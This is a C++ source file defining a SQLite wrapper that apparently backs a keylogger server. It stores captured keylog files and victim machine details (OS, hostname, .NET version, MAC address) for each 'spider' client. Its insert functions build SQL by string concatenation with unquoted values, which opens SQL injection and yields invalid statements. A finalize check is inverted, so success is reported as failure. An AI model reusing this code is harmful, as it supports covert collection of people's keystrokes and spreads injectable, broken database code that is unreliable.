#include "DB_SQLite.hpp"

DB_SQLite::DB_SQLite() {

}

bool	DB_SQLite::init(std::string const& file) {
	this->_stmt = NULL;
	this->_dbHandler = NULL;
	int ret;
	if ((ret = sqlite3_open_v2(file.c_str(), &_dbHandler, SQLITE_OPEN_READWRITE, NULL)) != SQLITE_OK) {
		std::cout << "SQLite Open Error : " << std::endl;
		return (false);
	}
	return (true);
}
bool	DB_SQLite::exec(std::string const& cmd) {
	if (sqlite3_prepare_v2(this->_dbHandler, cmd.c_str(), -1, &this->_stmt, NULL) != SQLITE_OK) {
		return (false);
	}
	return (true);
}

bool	DB_SQLite::add_keylogfiles(int id_spider, std::string date, const char *file, int filesize) {
	std::string cmd;
	cmd.append("INSERT INTO keylogfiles VALUES(");
	cmd += std::to_string(id_spider);
	cmd.append(",'");
	cmd.append(date);
	cmd.append("', ?)");
	if (this->exec(cmd) == false)
		return (false);
	if (sqlite3_bind_blob(this->_stmt, 1, file, filesize, SQLITE_STATIC) != SQLITE_OK) {
		std::cerr << "bind blob error" << std::endl;
		return (false);
	}
	if (sqlite3_step(_stmt) != SQLITE_DONE)
		std::cerr << "sqlite3_step error" << std::endl;
	sqlite3_finalize(_stmt);
	return (true);
}

bool DB_SQLite::add_targetsdata(int id_spider, std::string const& ostype, std::string const& _hostname, std::string const& dotnet, std::string const& mac_addr) {
	std::string cmd;
	cmd.append("INSERT INTO targetsdata VALUES(");
	cmd += std::to_string(id_spider);
	cmd += ", " + ostype + ", " + _hostname + ", " + dotnet + ", " + mac_addr + ");";
	std::cout << cmd << std::endl;
	if (this->exec(cmd) == false)
		return (false);
	if (sqlite3_finalize(_stmt) == false)
		return (false);
	return (true);
}

DB_SQLite::~DB_SQLite() {
	sqlite3_close(_dbHandler);
}
